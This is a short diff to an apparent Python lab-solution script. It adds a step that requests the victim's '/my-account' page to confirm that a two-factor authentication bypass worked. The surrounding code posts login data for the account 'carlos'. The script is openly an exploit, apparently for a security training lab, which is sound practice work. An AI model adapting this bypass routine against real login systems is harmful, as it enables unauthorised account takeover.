@@ -15,7 +15,13 @@ def access_carlos_account(s, url):
     r = s.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)
 
     # Confirm bypass
-    myacc
+    myaccount_url = url + "/my-account"
+    r = s.get(myaccount_url, verify=False, proxies=proxies)
+    if "Log out" in r.text:
+        print("(+) Sucessfully bypassed 2FA verification.")
+    else:
+        print("(-) Exploit failed.")
+        sys.exit(-1)
 
 def main():
     if len(sys.argv) !=2:
